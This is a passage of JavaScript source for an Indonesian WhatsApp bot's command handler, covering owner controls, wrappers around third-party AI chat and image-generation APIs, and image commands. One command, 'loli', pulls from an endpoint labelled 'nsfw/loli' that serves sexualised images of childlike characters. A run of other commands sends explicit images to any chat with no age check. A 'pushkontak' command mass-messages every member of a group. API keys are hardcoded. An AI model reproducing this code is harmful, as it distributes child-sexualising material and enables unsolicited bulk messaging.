"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *THANKS BUAT TEMEN² KU* 
━━━━━━━━━━━━━━━━━━━━━
➤ Shield (Sauma)
➤ Zulfa
➤ Sawali
➤ Kreyu
➤ Ari
➤ Zimura (Indra)
➤ Bim-Bim
➤ Bang Iman
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'realtime': case 'datajam': {
if (!isCreator) return paycall('*Khusus Owner Bot*')
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": Date.now(),
"title": `𝙎𝙀𝙆𝘼𝙍𝘼𝙉𝙂 𝙒𝘼𝙆𝙏𝙐 𝙈𝙀𝙉𝙐𝙉𝙅𝙐𝙆𝙆𝘼𝙉
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'totalfitur': {
m.reply(`_Total Semua Fitur Bot Nero Md ${totalFitur()}_`)
}
        break
case 'shutdown': case 'stop':
if (!isCreator) return paycall('*Khusus Owner Bot*')
paycall(`OKE DONE STOP🥰`)
await sleep(3000)
process.exit()
break
case 'restart':
if (!isCreator) return paycall('*Khusus Owner Bot*')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
await sleep(3000)
paytod('Sukses Merestart Ulang Bot🙏\nBot Kembali Pulih Tidak Delay Lagi🥰\n\n\nNote: Jika bot mengalami on/off dengan sendirinya, itu tandanya lagi reset sessions biar tidak delay (Jadi harap di tunggu sampai bener bener dipulihkan 😁)')
await start()
break
case 'bot': {
m.reply('Dah Online Kak><')
}
break
case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return paycall('*Khusus Owner Bot*')
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return m.reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    m.reply(teks)
                    await sleep(2000)
                    m.reply("Hapus file sampah...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Berhasil menghapus semua sampah di folder session")
                });
            }
            break
case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return m.reply('Pesan itu tidak dikirim oleh bot!')
                 conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'pushkontak':{
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!m.isGroup) return paycall(`di group coy`)
if (!text) return paycall(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let m of mem) {
await sleep(3000)
conn.sendMessage(m, {text: `${teksnye}`}, {quoted: blue})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'owner': case 'creator':{
 conn.sendContact(from, global.owner, blue)
await m.reply(`=====[ *DEVELOPER NERO BOT* ]=====
• Jangan Chat Sembarangan ke nomor owner maka akan Otomatis di blokir
• Jangan Call/telepon owner tanpa izin
• Chat langsung pada intinya
• Spam Owner Langsung Block
• Minimal Salam (Wajib)
=========================================`)
}
break
case 'addprem': {
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6282134110253`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
}
break
case 'delprem': {
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6282134110253`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
}
break
case 'addpremgc': {
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 120363140614576277`)
pkntd = q.split("|")[0].replace(/[^0-9]/g, '')+`@g.us`
premgc.push(pkntd)
fs.writeFileSync('./database/premiumgc.json', JSON.stringify(premgc))
reply(`Grup Dengan Id ${pkntd} Sudah Premium!`)
}
break
case 'delpremgc': {
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 120363140614576277`)
yantod = q.split("|")[0].replace(/[^0-9]/g, '')+`@g.us`
unpred = premgc.indexOf(yantod)
premgc.splice(unpred, 1)
fs.writeFileSync('./database/premiumgc.json', JSON.stringify(premgc))
reply(`Grup Dengan Id ${yantod} Telah Dihapus Premium!`)
}
break
//========================CHAT GPT VIP=========================//
case 'bingai': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
  if (!text) return m.reply('Hai saya bing Ai, Apa yang bisa saya bantu?')
  console.log(`[${new Date().toLocaleTimeString()}] ${text}`)
  let error1;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let response = await fetchJson(`https://aemt.me/bingai?text=${text}`)
    let databingai = await response.result
conn.sendMessage(m.chat, {
    text: databingai, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝘽𝙄𝙉𝙂 𝘼𝙄',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (er) {
					error1 = true;
				} finally {
					if (error1) {
						replyerror("Kami mengalami kesalahan internal.");
					}
					}
}
break
case 'bard': case 'bardai': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
  if (!text) return m.reply('Hai saya Bard Ai, Apa yang bisa saya bantu?')
  console.log(`[${new Date().toLocaleTimeString()}] ${text}`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let response = await fetchJson(`https://aemt.me/bard?text=${text}`)
    let databardai = response.result
conn.sendMessage(m.chat, {
    text: databardai, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝘽𝘼𝙍𝘿 𝘼𝙄',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
case 'chan': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
  if (!text) return m.reply('Hai saya ShinChan Ai, Apa yang bisa saya bantu?')
  console.log(`[${new Date().toLocaleTimeString()}] ${text}`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let response = await fetchJson(`https://aemt.me/ai/c-ai?prompt=Nama saya ShinChan, saya di tugaskan untuk membantu anda&text=${text}`)
    let chanai = await response.result
await conn.sendMessage(m.chat, {
    text: chanai, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 𝘼𝙄',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
case 'gemini': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
  if (!text) return m.reply('Hai saya Gemini Ai, Apa yang bisa saya bantu?')
  console.log(`[${new Date().toLocaleTimeString()}] ${text}`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let response = await fetchJson(`https://aemt.me/gemini?text=${text}`)
    let datagemini = response.result
conn.sendMessage(m.chat, {
    text: datagemini, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝙂𝙀𝙈𝙄𝙉𝙄 𝘼𝙄',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
case 'mtk': case 'aimtk': {
if (!text) return m.reply('Perlu bantuan mengerjakan matematika kah?')
  let error2;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let aimtkuy = await fetch(`https://vihangayt.me/tools/mathssolve?q=${text}`)
        let dataai = await aimtkuy.json()
conn.sendMessage(m.chat, {text: `${dataai.data}`}, {quoted: m})
} catch (er) {
					error2 = true;
				} finally {
					if (error2) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'aijs': {
if (!isCreator) return m.reply(`*khusus Owner*`)
  if (!text) return paycall('Ai khusus coding javascript')
  let error9;
try {
m.reply(global.wait)
    let res = await fetch(`https://skizo.tech/api/ai-code-generator?text=${text}&lang_code=javascript&apikey=nerobot`)
    let data = await res.json()   
  conn.sendMessage(m.chat, {text: `${data.response}`}, {quoted: m})
    } catch (er) {
					error9 = true;
				} finally {
					if (error9) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'aipy': {
if (!isCreator) return m.reply(`*khusus Owner*`)
  if (!text) return paycall('Ai khusus coding Python')
  let error34;
try {
m.reply(global.wait)
    let respy = await fetch(`https://skizo.tech/api/ai-code-generator?text=${text}&lang_code=python&apikey=nerobot`)
    let datapy = await respy.json()   
  conn.sendMessage(m.chat, {text: `${datapy.response}`}, {quoted: m})
    } catch (er) {
					error34 = true;
				} finally {
					if (error34) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'nero': case 'neroai': case 'aibb': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return m.reply('Apa yang bisa saya bantu?')
  let error33;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let aibb = await fetch(`https://api.caliph.biz.id/api/ai/blackbox?q=${text}&apikey=caliphkey`)
        let botilegal = await aibb.json()
conn.sendMessage(m.chat, {
    text: botilegal.result, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝘾𝙃𝘼𝙏𝙂𝙋𝙏 𝘽𝙡𝙖𝙘𝙠𝘽𝙤𝙭 𝙑4',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (er) {
					error33 = true;
				} finally {
					if (error33) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'blackbox': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return m.reply('Apa yang bisa saya bantu?')
  let error33;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let aibb = await fetch(`https://aemt.me/blackbox?text=${text}`)
        let botilegal2 = await aibb.json()
conn.sendMessage(m.chat, {
    text: botilegal2.result, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝘾𝙃𝘼𝙏𝙂𝙋𝙏 𝘽𝙡𝙖𝙘𝙠𝘽𝙤𝙭',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (er) {
					error33 = true;
				} finally {
					if (error33) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'openai4': case 'chatgptv4': case 'ai': {
//if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) return m.reply('Apa yang bisa saya bantu?')
  let error23;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    let airealtime = await fetchJson(`https://rest.dimasbotzz.my.id/api/ai/gptrealtime?q=${text}&realtime=true`)
    let chatgpt = await airealtime.result.response
conn.sendMessage(m.chat, {
    text: chatgpt, 
    contextInfo: {
    externalAdReply :{
    mediaUrl: 'https://instagram.com/shinchan.senpai', 
    mediaType: 1,
    title: '𝘾𝙃𝘼𝙏𝙂𝙋𝙏 𝙑4',
    body: `${tanggal} ××× ${time}`, 
    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
    sourceUrl: 'https://instagram.com/shinchan.senpai',
    renderLargerThumbnail: true, 
    showAdAttribution: true
    }}}, { quoted: m})
} catch (er) {
					error23 = true;
				} finally {
					if (error23) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
//========================WAIFU = LOLI========================//
case 'neko': case 'waifu': {
let error3;
try {
            axios.get(`https://api.waifu.pics/sfw/${command}`)
               .then(({
                  data
               }) => {
                  conn.sendImage(m.chat, data.url, done, m)
               })
               } catch (er) {
					error3 = true;
				} finally {
					if (error3) {
						replyerror("Yah Proses Gagal :(");
					}
					}
         }
         break
case 'loli': {
try {
await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=GataDios` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
//========================NSFW=========================//
         case 'hentai' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hneko' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'trap' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/trap`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'blowjob' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/blowjob`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'pussy' : {
try {
await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/pussy?apikey=GataDios` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'futanari':{
try {
await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/futanari?apikey=GataDios` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'png': {
if (!text) return paycall(`${prefix + command} NEZUKO`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
await conn.sendMessage(m.chat, { image: { url: `https://api.azz.biz.id/api/anime/${text}` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('Terjadi Kesalahan Saat Mengambil Gambar');
        }
}
break
case 'ahegao':{
try {
await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=GataDios` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'bdsm' :
let error6;
try {
conn.sendMessage(from, { image: { url: `https://api.ouzen.xyz/api/morensfw/bdsm?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error6 = true;
				} finally {
					if (error6) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'femdom': {
try {
conn.sendMessage(m.chat, { image: { url: `https://api.ouzen.xyz/api/morensfw/femdom?apikey=zenzkey_133c4d90d6` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'masturbation' :
let error7;
try {
conn.sendMessage(from, { image: { url: `https://api.ouzen.xyz/api/morensfw/masturbation?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error7 = true;
				} finally {
					if (error7) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'oppai':
let error21;
try {
conn.sendMessage(from, { image: { url: `https://api.ouzen.xyz/randomanime/${command}?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error21 = true;
				} finally {
					if (error21) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'yuri':
let error22;
try {
conn.sendMessage(from, { image: { url: `https://api.ouzen.xyz/api/morensfw/${command}?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error22 = true;
				} finally {
					if (error22) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'cum': {
try {
await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random2/cum_jpg?apikey=GataDios` }, caption: done }, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
//========================REMINI=========================//
case 'remini': {
			if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			conn.sendMessage(m.chat, { image: proses, caption: `𝑭𝒐𝒕𝒐 𝒅𝒂𝒉 𝒋𝒂𝒅𝒊 𝑯𝑫 𝒃𝒍𝒐𝒎 𝒃𝒂𝒏𝒈? \n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: m})
			}
			break
/*case 'hd': case '4k': {
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
let error8;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://api.betabotz.org/api/tools/remini-v3?url=${anu}&resolusi=4&apikey=hYnG4TVp`)
let data = await response.json()
let kapsion = `𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`
await conn.sendImage(m.chat, data.url, kapsion, m)
} catch (er) {
					error8 = true;
				} finally {
					if (error8) {
						replyerror("Yah Proses Gagal :(");
					}
					}
			}
			break*/
case 'hd': case '4k': {
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetch(`https://aemt.me/remini?url=${anu}&resolusi=4`)
let data = await response.json()
let kapsion = `𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 𝑯𝑫\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`
await conn.sendImage(m.chat, data.url, kapsion, m)
} catch (error) {
        console.error(error);
        replyerror(`Yah Proses Gagal:(`);
    }
			}
			break
case 'carbon': {
if (!text) return paycall(`${prefix + command} teksnya`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/carbon?text=${text}`)
await conn.sendImage(m.chat, response.result, done, m)
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
			break
//========================REMOVE BAGROUND=========================//
case 'removebg': {
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/removebg?url=${anu}`)
let hasilnyabg = response.url
await conn.sendImage(m.chat, hasilnyabg.result, done, m)
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
			break
case 'txtimg': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/ai/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'txtimg2': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v1/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'txtimg3': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v2/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'txtimg4': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v3/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'txtimg5': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v4/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'txtimg6': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v5/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'animedif': case 'animediffusion': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://aemt.me/v6/text2img?text=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'animedif2': case 'animediffusion2': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const response = `https://api.azz.biz.id/api/animediffusion3?q=${text}`
//await conn.sendImage(m.chat, response, done, m)
await conn.sendMessage(m.chat, { image: { url: response }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror('ERROR.');
    }
}
break
case 'bardimg': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command} teksnya`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/bardimg?url=${anu}&text=${text}`)
conn.sendMessage(m.chat, {text: `${response.result}`}, {quoted: m})
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
			break
case 'bingimg': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${prefix + command} Masukan Prompt Nya Kak><`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://aemt.me/bingimg?text=${text}`)
//await conn.sendImage(m.chat, response.result, donatur, m)
await conn.sendMessage(m.chat, { image: { url: response.result }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
			break
case 'cartoon': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${prefix + command} Masukan Prompt Nya Kak><`)
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await fetchJson(`https://rest.dimasbotzz.my.id/api/ai/render3d?prompt=${text}`)
//await conn.sendImage(m.chat, response.result, donatur, m)
await conn.sendMessage(m.chat, { image: { url: response.result }, caption: `${done}`}, { quoted: m })
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
			}
			break
case 'bingimg2': {
if (!isPremgc && !isCreator) return replytolak(premiumgc)
if (!text) return paycall(`${prefix + command} Masukan Prompt Nya Kak><`)
try {
  await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  let res = await fetchJson(`https://rest.dimasbotzz.my.id/api/text2img/bing-image2?prompt=${text}`);
  if (res.result?.length) {
    for (let i = 0; i < res.result?.length; i++) {
     // await conn.sendImage(m.chat, res.data[i], done, m);
     await conn.sendMessage(m.chat, { image: { url: res.result[i] }, caption: `${done}`}, { quoted: m })
    }
  } else {
    m.reply('Server sedang sibuk sekarang. Coba lagi nanti !');
  }
} catch (error) {
  console.error(error);
  replyerror(`ERROR`);
}
}
break;
//=========================================================//
/*case 'realistic': {
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
reply(global.wait);
const response = `https://api.yanzbotz.my.id/api/text2img/realistic?prompt=${text}`
